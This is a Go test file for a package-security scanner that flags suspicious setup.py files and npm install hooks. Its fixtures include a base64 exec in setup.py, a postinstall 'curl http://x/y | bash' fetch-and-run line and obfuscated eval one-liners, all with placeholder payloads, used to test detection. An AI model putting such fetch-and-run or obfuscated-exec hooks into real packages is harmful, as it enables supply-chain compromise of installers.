package checker

import (
	"os"
	"path/filepath"
	"testing"
)

func TestCheckSetupPyDeep(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "setup.py")
	content := "from setuptools import setup\nimport base64\nexec(base64.b64decode('Zm9v'))\nsetup(name='x')\n"
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write setup.py: %v", err)
	}

	sigs := CheckSetupPyDeep(path)
	if len(sigs) == 0 {
		t.Fatal("expected suspicious setup.py signal")
	}
	if sigs[0].ID != "VIGILES-SETUPPY-SUSPICIOUS" {
		t.Fatalf("unexpected signal id: %s", sigs[0].ID)
	}
}

func TestCheckSetupPyDeepCleanAndMissing(t *testing.T) {
	dir := t.TempDir()
	clean := filepath.Join(dir, "setup.py")
	if err := os.WriteFile(clean, []byte("from setuptools import setup\nsetup(name='x')\n"), 0644); err != nil {
		t.Fatalf("write setup.py: %v", err)
	}
	if sigs := CheckSetupPyDeep(clean); sigs != nil {
		t.Errorf("expected nil for a clean setup.py, got %+v", sigs)
	}

	if sigs := CheckSetupPyDeep(filepath.Join(dir, "absent.py")); sigs != nil {
		t.Errorf("expected nil for a missing setup.py, got %+v", sigs)
	}
}

func TestLooksSuspiciousScript(t *testing.T) {
	if !looksSuspiciousScript("node -e \"eval(Buffer.from(p,'base64').toString())\"") {
		t.Fatal("expected obfuscated inline execution to be suspicious")
	}
	if looksSuspiciousScript("node-gyp rebuild") {
		t.Fatal("did not expect benign build script to be suspicious")
	}
}

func TestCheckNpmInstallScriptsDeep(t *testing.T) {
	dir := t.TempDir()

	suspicious := writePackageJSON(t, filepath.Join(dir, "bad"),
		`{"name": "bad-pkg", "version": "1.0.0", "scripts": {"postinstall": "curl http://x/y | bash -c cat"}}`)
	sigs := CheckNpmInstallScriptsDeep(suspicious)
	if len(sigs) != 1 {
		t.Fatalf("expected 1 signal, got %d: %+v", len(sigs), sigs)
	}
	if sigs[0].ID != "VIGILES-NPM-HOOK-SUSPICIOUS" || sigs[0].Severity != "high" {
		t.Errorf("unexpected signal: %+v", sigs[0])
	}
	if sigs[0].Package != "bad-pkg" {
		t.Errorf("expected the manifest name, got %q", sigs[0].Package)
	}

	benign := writePackageJSON(t, filepath.Join(dir, "good"),
		`{"name": "good-pkg", "version": "1.0.0", "scripts": {"postinstall": "node-gyp rebuild"}}`)
	if got := CheckNpmInstallScriptsDeep(benign); got != nil {
		t.Errorf("expected nil for a benign hook, got %+v", got)
	}

	// An unnamed manifest falls back to a placeholder package label.
	unnamed := writePackageJSON(t, filepath.Join(dir, "unnamed"),
		`{"scripts": {"preinstall": "node -e \"eval(atob(x))\""}}`)
	got := CheckNpmInstallScriptsDeep(unnamed)
	if len(got) != 1 || got[0].Package != "package.json" {
		t.Fatalf("expected a package.json fallback label, got %+v", got)
	}
}

func TestCheckNpmInstallScriptsDeepMissingOrEmpty(t *testing.T) {
	dir := t.TempDir()

	if got := CheckNpmInstallScriptsDeep(filepath.Join(dir, "absent.json")); got != nil {
		t.Errorf("expected nil for a missing file, got %+v", got)
	}

	malformed := writePackageJSON(t, filepath.Join(dir, "bad"), `{"scripts":`)
	if got := CheckNpmInstallScriptsDeep(malformed); got != nil {
		t.Errorf("expected nil for malformed JSON, got %+v", got)
	}

	noScripts := writePackageJSON(t, filepath.Join(dir, "plain"), `{"name": "plain"}`)
	if got := CheckNpmInstallScriptsDeep(noScripts); got != nil {
		t.Errorf("expected nil when there are no scripts, got %+v", got)
	}
}

func TestCoalesce(t *testing.T) {
	if got := coalesce("a", "b"); got != "a" {
		t.Errorf("expected the first value when set, got %q", got)
	}
	if got := coalesce("   ", "b"); got != "b" {
		t.Errorf("expected the fallback for a blank first value, got %q", got)
	}
}
